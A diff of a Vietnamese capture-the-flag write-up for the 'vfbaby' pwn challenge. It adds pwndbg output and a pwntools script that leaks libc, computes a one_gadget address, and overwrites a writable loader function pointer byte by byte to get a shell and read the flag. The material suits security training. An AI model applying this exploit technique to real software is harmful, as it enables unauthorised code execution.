@@ -1,4 +1,4 @@
-# write up vfbaby 
+![image](https://github.com/antkss/training_task/assets/88892713/e2666030-8083-4a99-a197-acc3210d6550)# write up vfbaby 
 - khi mở chương trình lên, chương trình cho phép em có thể có được địa chỉ của libc
 ```shell
 as@vfbaby🍎 ls
@@ -57,20 +57,86 @@ exit (int status)
    0x7c0c1f03a009    ror    rax, 0x11
 
   ```
-- khi đi sâu vào hàm mà đc call từ rdx, ta sẽ thấy có 1 vị trí call khác là  ``` call   qword ptr [rip + 0x216414]    <0x7c0c1f400c90>```
+- khi đi sâu vào hàm mà đc call từ rdx, ta sẽ thấy có 1 vị trí call khác là  ``` call   qword ptr [rip + 0x216414]   ```
 ```assembly
-  0x7c0c1f410ae0    lea    rax, [rax + rax*8]
-   0x7c0c1f410ae4    lea    rcx, [rip + 0x215555]         <_rtld_global>
-   0x7c0c1f410aeb    shl    rax, 4
-   0x7c0c1f410aef    lea    r12, [rcx + rax - 0x88]
-   0x7c0c1f410af7    jmp    0x7c0c1f410b27                <0x7c0c1f410b27>
+  0x75aba1e10ae0    lea    rax, [rax + rax*8]
+   0x75aba1e10ae4    lea    rcx, [rip + 0x215555]         <_rtld_global>
+   0x75aba1e10aeb    shl    rax, 4
+   0x75aba1e10aef    lea    r12, [rcx + rax - 0x88]
+   0x75aba1e10af7    jmp    0x75aba1e10b27                <0x75aba1e10b27>
     ↓
- ► 0x7c0c1f410b27    lea    rdi, [rip + 0x215e1a]         <_rtld_global+2312>
-   0x7c0c1f410b2e    call   qword ptr [rip + 0x216414]    <0x7c0c1f400c90>
+ ► 0x75aba1e10b27    lea    rdi, [rip + 0x215e1a]         <_rtld_global+2312>
+   0x75aba1e10b2e    call   qword ptr [rip + 0x216414]    <0x75aba1e00c90>
  
-   0x7c0c1f410b34    mov    ecx, dword ptr [r12]
-   0x7c0c1f410b38    test   ecx, ecx
-   0x7c0c1f410b3a    je     0x7c0c1f410b00                <0x7c0c1f410b00>
+   0x75aba1e10b34    mov    ecx, dword ptr [r12]
+   0x75aba1e10b38    test   ecx, ecx
+   0x75aba1e10b3a    je     0x75aba1e10b00                <0x75aba1e10b00>
  
-   0x7c0c1f410b3c    mov    rax, qword ptr [r12 - 8]
+   0x75aba1e10b3c    mov    rax, qword ptr [r12 - 8]
+```
+- lệnh call đó có nghĩa là nó sẽ call giá trị chứa trong địa chỉ $rip+0x216414 với $rip được tính theo câu lệnh trước đó ở đây $rip =    0x75aba1e10b34
+- khi check thì địa chỉ tại đây có quyền đọc ghi nên em có thể dùng để khai thác
+```assembly
+pwndbg> vm 0x75aba1e10b34+0x216414
+LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
+             Start                End Perm     Size Offset File
+    0x75aba2025000     0x75aba2026000 r--p     1000  25000 /home/as/pwnable/vfbaby/ld-2.23.so
+►   0x75aba2026000     0x75aba2027000 rw-p     1000  26000 /home/as/pwnable/vfbaby/ld-2.23.so +0xf48
+    0x75aba2027000     0x75aba2028000 rw-p     1000      0 [anon_75aba2027]
+```
+- sau khi xong thì em có thể dùng onegadget và ghi 3 byte đầu vào thông qua arbitrary read
+
+```python
+p.recvuntil(b'a gift ')
+input()
+addr = p.recvuntil(b',', drop=True)
+leak_addr = int(addr, 16)
+base_libc = leak_addr - 0xcc230
+one_gadget = base_libc + 0xf02a4
+write_addr = base_libc+0x626f48
+
+part1_onegadget = one_gadget & 0xff
+part2_onegadget = (one_gadget >> 8) & 0xff
+part3_onegadget = (one_gadget >> 16) & 0xff
+
+
+xor2 = leak_addr+ 0x2f9a28 
+xor1 = leak_addr 
+push_rbp_ld = leak_addr + 3426432
+
+p.sendafter(b'good luck ;)',p64(write_addr))
+input()
+p.send(p64(part1_onegadget))
+input()
+p.send(p64(write_addr + 1))
+input()
+p.send(p64(part2_onegadget))
+input()
+p.send(p64(write_addr + 2))
+input()
+p.send(p64(part3_onegadget))
+input()
+```
+
+- sau khi chạy code thì shell vẫn được thực thi nhưng stdout bị đóng nên cần phải nhập ```bash exec 1>&- ``` để mở lại stdout
+- test thử khả năng run ở local
+```bash
+as@vfbaby🍎 ls
+2               libc-2.23.so  vfbaby          vfbaby_patched-origin      vfbaby_patched-origin.id2
+flag            libc.so.6     vfbaby.i64      vfbaby_patched-origin.i64  vfbaby_patched-origin.nam
+howtoror17.txt  ptr_guard.py  vfbaby.py       vfbaby_patched-origin.id0  vfbaby_patched-origin.til
+ld-2.23.so      solve.py      vfbaby_patched  vfbaby_patched-origin.id1  vfbaby_patched.i64
+```
+```bash
+  $ cat flag > lmao
+[DEBUG] Sent 0x10 bytes:
+    b'cat flag > lmao\n'
+```
+```bash
+as@vfbaby🍎 ls
+2               libc.so.6     vfbaby.i64                 vfbaby_patched-origin.id0  vfbaby_patched.i64
+flag            lmao          vfbaby.py                  vfbaby_patched-origin.id1
+howtoror17.txt  ptr_guard.py  vfbaby_patched             vfbaby_patched-origin.id2
+ld-2.23.so      solve.py      vfbaby_patched-origin      vfbaby_patched-origin.nam
+libc-2.23.so    vfbaby        vfbaby_patched-origin.i64  vfbaby_patched-origin.til
 ```
